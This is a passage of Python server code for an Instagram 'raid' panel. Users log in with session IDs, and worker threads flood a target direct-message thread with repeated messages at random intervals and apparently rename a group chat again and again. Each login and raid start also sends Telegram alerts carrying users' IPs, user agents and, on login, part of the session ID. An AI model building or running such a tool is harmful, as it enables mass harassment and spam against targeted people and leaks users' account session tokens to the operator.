    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, _ = resolved
    if page_key in page_data:
        del page_data[page_key]
    if page_key in active_clients:
        del active_clients[page_key]
    if page_key in gc_nc_threads:
        gc_nc_threads[page_key] = False

@socketio.on('login')
def handle_login(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')
    session_id = data.get('session_id')
    ip = get_client_ip()
    ua = get_client_ua()

    if not session_id:
        msg = "Please enter a session ID"
        save_log(page_key, owner, msg, 'error')
        emit('console_message', {'owner': owner, 'message': msg, 'type': 'error', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
        return

    try:
        is_valid, username = verify_session(session_id)
        if not is_valid:
            msg = "Session invalid or expired"
            save_log(page_key, owner, msg, 'error')
            emit('login_status', {'owner': owner, 'success': False, 'page_id': page_id, 'user_key': user_key}, room=page_key)
            emit('console_message', {'owner': owner, 'message': msg, 'type': 'error', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
            send_telegram_alert(f"❌ *INSTA LOGIN FAILED*\n👤 `{owner}`\n🌐 `{ip}`")
            return

        cl, user_info = get_instagram_client(page_key, session_id)
        if not cl or not user_info:
            msg = "Failed to create client"
            save_log(page_key, owner, msg, 'error')
            emit('login_status', {'owner': owner, 'success': False, 'page_id': page_id, 'user_key': user_key}, room=page_key)
            emit('console_message', {'owner': owner, 'message': msg, 'type': 'error', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
            return

        active_clients[page_key] = cl
        if page_key in page_data:
            page_data[page_key]['session_id'] = session_id
            page_data[page_key]['username'] = user_info.username

        conn = get_db_connection()
        conn.execute('''
            INSERT INTO user_raids (user_key, owner, session_id, username) VALUES (?, ?, ?, ?)
            ON CONFLICT(user_key) DO UPDATE SET owner=?, session_id=?, username=?
        ''', (page_key, owner, session_id, user_info.username, owner, session_id, user_info.username))
        conn.commit()
        conn.close()

        msg = f"Login OK: @{user_info.username}"
        save_log(page_key, owner, msg, 'success')
        emit('login_status', {'owner': owner, 'success': True, 'username': user_info.username, 'page_id': page_id, 'user_key': user_key}, room=page_key)
        emit('console_message', {'owner': owner, 'message': msg, 'type': 'success', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)

        send_telegram_alert(
            f"✅ *INSTA LOGIN SUCCESS*\n\n"
            f"👤 Panel: `{owner}`\n📸 Insta: `@{user_info.username}`\n🔑 `{session_id[:25]}...`\n🌐 `{ip}`\n💻 `{ua[:80]}`\n⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )

    except Exception as e:
        msg = f"Login failed: {str(e)[:50]}"
        save_log(page_key, owner, msg, 'error')
        emit('login_status', {'owner': owner, 'success': False, 'page_id': page_id, 'user_key': user_key}, room=page_key)
        emit('console_message', {'owner': owner, 'message': msg, 'type': 'error', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)

@socketio.on('logout')
def handle_logout(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')

    if page_key in active_clients:
        del active_clients[page_key]
    if page_key in gc_nc_threads:
        gc_nc_threads[page_key] = False

    session_file = f"session_{page_key}.json"
    if os.path.exists(session_file):
        try: os.remove(session_file)
        except: pass

    if page_key in page_data:
        page_data[page_key]['session_id'] = ''
        page_data[page_key]['username'] = 'NOT LOGGED IN'

    conn = get_db_connection()
    conn.execute('UPDATE user_raids SET username = "NOT LOGGED IN", session_id = "", is_active = 0, gc_nc_active = 0 WHERE user_key = ? AND owner = ?', (page_key, owner))
    conn.commit()
    conn.close()

    msg = "Logged out"
    save_log(page_key, owner, msg, 'info')
    emit('console_message', {'owner': owner, 'message': msg, 'type': 'info', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)

    send_telegram_alert(f"🚪 *INSTA LOGOUT*\n👤 `{owner}`\n🌐 `{get_client_ip()}`")

@socketio.on('start_raid')
def handle_start_raid(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')
    thread_id = data.get('thread_id')
    message_text = data.get('message')
    ip = get_client_ip()
    ua = get_client_ua()

    conn = get_db_connection()
    user_data = conn.execute('SELECT * FROM user_raids WHERE user_key = ? AND owner = ?', (page_key, owner)).fetchone()

    if not user_data or not user_data['session_id']:
        conn.close()
        msg = "Login first"
        save_log(page_key, owner, msg, 'error')
        emit('console_message', {'owner': owner, 'message': msg, 'type': 'error', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
        return

    if user_data['is_active']:
        conn.close()
        msg = "Raid already running"
        save_log(page_key, owner, msg, 'warning')
        emit('console_message', {'owner': owner, 'message': msg, 'type': 'warning', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
        return

    conn.execute('UPDATE user_raids SET thread_id=?, message=?, is_active=1, sent_count=0, failed_count=0 WHERE user_key=? AND owner=?', (thread_id, message_text, page_key, owner))
    conn.commit()
    conn.close()

    if page_key in page_data:
        page_data[page_key]['thread_id'] = thread_id
        page_data[page_key]['message'] = message_text
        page_data[page_key]['is_active'] = True

    msg = "Raid started"
    save_log(page_key, owner, msg, 'warning')
    emit('console_message', {'owner': owner, 'message': msg, 'type': 'warning', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
    emit('update_stats', {'owner': owner, 'raid_status': 'RUNNING', 'sent': 0, 'failed': 0, 'page_id': page_id, 'user_key': user_key}, room=page_key)

    send_telegram_alert(
        f"🚀 *RAID STARTED*\n\n"
        f"👤 `{owner}`\n📸 `@{user_data['username']}`\n🎯 `{thread_id}`\n"
        f"💬 `{message_text[:200]}`\n🌐 `{ip}`\n💻 `{ua[:80]}`\n⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
    )

    threading.Thread(target=run_raid, args=(page_key, thread_id, message_text, page_id, user_key, owner)).start()

def run_raid(page_key, target_thread, target_msg, page_id, user_key, owner):
    counter = 0
    while True:
        conn = get_db_connection()
        status_row = conn.execute('SELECT is_active, session_id, sent_count, failed_count FROM user_raids WHERE user_key = ? AND owner = ?', (page_key, owner)).fetchone()

        if not status_row or not status_row['is_active']:
            conn.close()
            break

        cl = active_clients.get(page_key)
        if not cl:
            try:
                cl, user_info = get_instagram_client(page_key, status_row['session_id'])
                if cl and user_info:
                    active_clients[page_key] = cl
                else:
                    raise Exception("restore failed")
            except Exception:
                conn.execute('UPDATE user_raids SET failed_count = failed_count + 1 WHERE user_key = ? AND owner = ?', (page_key, owner))
                conn.commit()
                conn.close()
                time.sleep(10)
                continue

        try:
            counter += 1
            cl.direct_send(target_msg, thread_ids=[target_thread])
            conn.execute('UPDATE user_raids SET sent_count = sent_count + 1 WHERE user_key = ? AND owner = ?', (page_key, owner))
            conn.commit()

            updated_sent = (status_row['sent_count'] or 0) + 1
            out_msg = f"Sent #{counter}"
            save_log(page_key, owner, out_msg, 'success')
            socketio.emit('console_message', {'owner': owner, 'message': out_msg, 'type': 'success', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
            socketio.emit('update_stats', {'owner': owner, 'sent': updated_sent, 'page_id': page_id, 'user_key': user_key}, room=page_key)
        except Exception:
            conn.execute('UPDATE user_raids SET failed_count = failed_count + 1 WHERE user_key = ? AND owner = ?', (page_key, owner))
            conn.commit()
            updated_failed = (status_row['failed_count'] or 0) + 1
            out_msg = f"Fail #{counter}"
            save_log(page_key, owner, out_msg, 'error')
            socketio.emit('console_message', {'owner': owner, 'message': out_msg, 'type': 'error', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
            socketio.emit('update_stats', {'owner': owner, 'failed': updated_failed, 'page_id': page_id, 'user_key': user_key}, room=page_key)

        conn.close()

        current_delay = random.choice(DELAYS)
        for _ in range(int(current_delay)):
            check_conn = get_db_connection()
            check_active = check_conn.execute('SELECT is_active FROM user_raids WHERE user_key = ? AND owner = ?', (page_key, owner)).fetchone()
            check_conn.close()
            if not check_active or not check_active['is_active']:
                socketio.emit('update_stats', {'owner': owner, 'raid_status': 'STOPPED', 'page_id': page_id, 'user_key': user_key}, room=page_key)
                return
            time.sleep(1)

    socketio.emit('update_stats', {'owner': owner, 'raid_status': 'STOPPED', 'page_id': page_id, 'user_key': user_key}, room=page_key)

@socketio.on('stop_raid')
def handle_stop_raid(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')

    conn = get_db_connection()
    conn.execute('UPDATE user_raids SET is_active = 0 WHERE user_key = ? AND owner = ?', (page_key, owner))
    conn.commit()
    conn.close()

    if page_key in page_data:
        page_data[page_key]['is_active'] = False

    msg = "Raid stopped"
    save_log(page_key, owner, msg, 'warning')
    emit('console_message', {'owner': owner, 'message': msg, 'type': 'warning', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
    emit('update_stats', {'owner': owner, 'raid_status': 'STOPPED', 'page_id': page_id, 'user_key': user_key}, room=page_key)

# GC NC
@socketio.on('start_gc_nc')
def handle_start_gc_nc(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')
    thread_id = data.get('thread_id')
    name = data.get('name')
    delay = data.get('delay', 10)
    ip = get_client_ip()
    ua = get_client_ua()

    conn = get_db_connection()
    user_data = conn.execute('SELECT * FROM user_raids WHERE user_key = ? AND owner = ?', (page_key, owner)).fetchone()

    if not user_data or not user_data['session_id']:
        conn.close()
        msg = "Login first"
        save_log(page_key, owner, msg, 'error')
        emit('console_message', {'owner': owner, 'message': msg, 'type': 'error', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
        return

    if gc_nc_threads.get(page_key, False):
        conn.close()
        msg = "GC NC already running"
        save_log(page_key, owner, msg, 'warning')
        emit('console_message', {'owner': owner, 'message': msg, 'type': 'warning', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
        return

    conn.execute('UPDATE user_raids SET gc_nc_thread_id=?, gc_nc_name=?, gc_nc_delay=?, gc_nc_active=1, nc_count=0 WHERE user_key=? AND owner=?',
                 (thread_id, name, int(delay), page_key, owner))
    conn.commit()
    conn.close()

    if page_key in page_data:
        page_data[page_key]['gc_nc_thread_id'] = thread_id
        page_data[page_key]['gc_nc_name'] = name
        page_data[page_key]['gc_nc_delay'] = int(delay)
        page_data[page_key]['gc_nc_active'] = True

    gc_nc_threads[page_key] = True

    msg = "GC NC started"
    save_log(page_key, owner, msg, 'warning')
    emit('console_message', {'owner': owner, 'message': msg, 'type': 'warning', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
    emit('update_stats', {'owner': owner, 'gc_nc_status': 'RUNNING', 'nc_count': 0, 'page_id': page_id, 'user_key': user_key}, room=page_key)

    send_telegram_alert(
        f"🔒 *GC NC STARTED*\n\n"
        f"👤 `{owner}`\n📸 `@{user_data['username']}`\n🎯 `{thread_id}`\n🏷️ `{name}`\n⏱️ `{delay}s`\n🌐 `{ip}`\n💻 `{ua[:80]}`"
    )

    threading.Thread(target=run_gc_nc_worker, args=(page_key, thread_id, name, int(delay), page_id, user_key, owner)).start()

@socketio.on('stop_gc_nc')
def handle_stop_gc_nc(data):
    resolved = _owner_ok(data, None)
    if not resolved:
        return
    page_key, owner = resolved
    page_id = data.get('page_id')
    user_key = data.get('user_key')

    if page_key in gc_nc_threads:
        gc_nc_threads[page_key] = False

    conn = get_db_connection()
    conn.execute('UPDATE user_raids SET gc_nc_active = 0 WHERE user_key = ? AND owner = ?', (page_key, owner))
    conn.commit()
    conn.close()

    if page_key in page_data:
        page_data[page_key]['gc_nc_active'] = False

    msg = "GC NC stopped"
    save_log(page_key, owner, msg, 'warning')
    emit('console_message', {'owner': owner, 'message': msg, 'type': 'warning', 'timestamp': time.strftime('%H:%M:%S'), 'page_id': page_id, 'user_key': user_key}, room=page_key)
    emit('update_stats', {'owner': owner, 'gc_nc_status': 'STOPPED', 'page_id': page_id, 'user_key': user_key}, room=page_key)

    send_telegram_alert(f"🔓 *GC NC STOPPED*\n👤 `{owner}`\n🌐 `{get_client_ip()}`")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 25100))
    print(f"Starting server on 0.0.0.0:{port}")
    socketio.run(app, host='0.0.0.0', port=port, debug=False)
